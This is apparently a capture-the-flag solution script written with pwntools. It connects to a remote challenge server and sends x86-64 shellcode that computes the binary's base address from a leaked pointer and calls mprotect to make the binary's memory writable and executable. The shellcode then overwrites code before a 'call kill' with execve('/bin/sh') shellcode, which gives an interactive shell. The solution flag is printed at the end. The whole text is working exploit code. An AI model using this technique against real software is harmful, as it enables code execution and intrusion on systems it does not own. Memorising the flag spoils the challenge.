from pwn import *
elf = ELF('./challenge', checksec=False)
# p = elf.process()
p = remote(b'139.59.234.75', 3001)

def write_what_where(reg, src):
    payload = ''.join([
        'mov rax, %s\n' % hex(u64(src.ljust(8, b'\x00'))),
        # 'mov rdx, %s\n' % hex(dest),
        'add %s, 8\n' % reg,
        'mov [%s], rax\n' % reg,
    ])
    return payload

def write_str(reg_target, reg_from, data):
    payload  = 'mov %s, %s\n' % (reg_target, reg_from)
    data_split = [data[i:i+8].ljust(8, b'\x00') for i in range(0, len(data), 8)]
    for d in data_split:
        payload += write_what_where(reg_target, d)
    return payload

shellcode = asm('''
/* nop sleeding pala lu */
nop;nop;nop;nop

/* get current map memory */
lea rsp, [rip-0x3b]

/* get leak elf and calculate elf base address */
/* d5:06a8│ 0x7fdcb8a8b6a8 —▸ 0x558e213394de ◂— test eax, eax */
mov rdi, [rsp+0x06a8]
sub rdi, 0x14de

/* size */
mov rsi, 0x4000

/* PROT_EXEC|PROT_WRITE|PROT_READ */
mov rdx, 7

/* mprotect (make elf rwx again) */
mov rax, 0x9
inc rax
syscall

/* overwrite some address before "call kill" function */
mov r8, rdi
add r8, 0x0000156d

/* insert write what where payload */
%s

/* exit */
mov rax, SYS_exit
syscall
''' % (write_str('rdx', 'r8', asm(shellcraft.amd64.execve('/bin/sh'), arch='amd64'))), arch='amd64')
p.sendlineafter(b'code: ', shellcode)
log.warn('wait 3-5 sec to popup shell ...')
p.interactive()
# CJ2023{ffb15467809adc830adcddd875326518}